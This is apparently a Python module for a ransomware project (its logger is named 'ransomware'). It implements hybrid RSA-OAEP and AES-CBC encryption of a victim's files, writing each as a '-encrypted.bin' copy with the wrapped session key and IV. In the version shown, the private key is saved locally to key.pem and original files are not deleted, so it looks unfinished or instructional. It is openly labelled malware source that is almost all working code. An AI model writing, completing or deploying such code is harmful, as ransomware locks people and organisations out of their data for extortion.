from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util.Padding import pad

import logging

logger = logging.getLogger("ransomware")


RSA_KEY_SIZE = 2048


class RSAAESEncryption:
    def __init__(self, private_key: str | None = None, **kwargs) -> None:
        self.private_key = private_key or self._generate_rsa_key()
        self.session_key = get_random_bytes(16)

    def _export_key(self):
        """
        Write the private key to a file
        """
        # TODO: Write key in a secure way (e.g. memory-mapped file)
        with open("key.pem", "wb+") as pkf:
            pkf.write(self.private_key.export_key())

    def _generate_rsa_key(self):
        """
        Generate a new RSA key pair
        """
        return RSA.generate(RSA_KEY_SIZE)

    def _overwrite_data(self, file_path: str, enc_session_key: bytes, iv, ciphertext: bytes):
        """
        Write the encrypted data to a file
        """
        with open(f"{file_path}-encrypted.bin", "wb+") as overwrite_f:
            overwrite_f.write(enc_session_key)
            overwrite_f.write(iv)
            overwrite_f.write(ciphertext)
            overwrite_f.close()

    def encrypt(self, fpath: str) -> bytes:
        """
        Encrypt a file
        """
        dataf = open(fpath, "rb")
        data = dataf.read()
        self._export_key()
        # Encrypt the session key with the public RSA key
        cipher_rsa = PKCS1_OAEP.new(self.private_key)
        enc_session_key = cipher_rsa.encrypt(self.session_key)

        # Encrypt the data with the AES session key
        cipher_aes = AES.new(self.session_key, AES.MODE_CBC)
        ciphertext = cipher_aes.encrypt(pad(data, AES.block_size))
        dataf.close()
        self._overwrite_data(fpath, enc_session_key, cipher_aes.iv, ciphertext)
